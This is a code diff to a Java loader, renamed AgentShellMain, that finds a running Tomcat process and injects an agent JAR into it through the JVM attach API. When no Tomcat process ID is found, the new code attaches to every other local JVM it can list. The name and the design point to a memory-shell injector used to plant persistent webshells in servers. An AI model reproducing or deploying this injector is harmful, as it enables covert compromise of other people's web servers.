@@ -5,26 +5,61 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class Main {
+public class AgentShellMain {
     public static void main(String[] args) throws Exception{
         String path = args[0];
         System.out.println(path);
         File file = new File(path);
         if (file.isFile()){
-            String pid = Main.getTomcatPid();
-            VirtualMachine vm = VirtualMachine.attach(pid);
-            System.out.println(pid);
-            vm.loadAgent(path);
-            vm.detach();
+            String pid = AgentShellMain.getTomcatPid();
+            if(pid == null){
+                pid = AgentShellMain.getTomcatPid2();
+            }
+            if (pid != null){
+                VirtualMachine vm = VirtualMachine.attach(pid);
+                System.out.println(pid);
+                vm.loadAgent(path);
+                vm.detach();
+            }else {
+                List<String> allId = AgentShellMain.getAllId();
+                for (String id : allId){
+                    try {
+                        VirtualMachine vm = VirtualMachine.attach(id);
+                        System.out.println(id);
+                        vm.loadAgent(path);
+                        vm.detach();
+                    }catch (Exception e){
+                        e.printStackTrace();
+                    }
+                }
+            }
         }else {
             throw new Exception("[!] " + path + " is not a file");
         }
-
     }
+    public static List<String> getAllId(){
+        List<String> l = new ArrayList<>();
+        try{
+            List<VirtualMachineDescriptor> list = VirtualMachine.list();
+            for (VirtualMachineDescriptor v:list){
+                if (v.displayName().contains("org.jetbrains.jps.cmdline.Launcher") || v.displayName().contains("AgentShellMain") || v.displayName().contains("RemoteMavenServer") || v.displayName().equals("")){
+                    continue;
+                }
+                l.add(v.id());
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        return l;
+    }
+
+
     public static String getTomcatPid(){
         try {
             Process ps = Runtime.getRuntime().exec("jps");
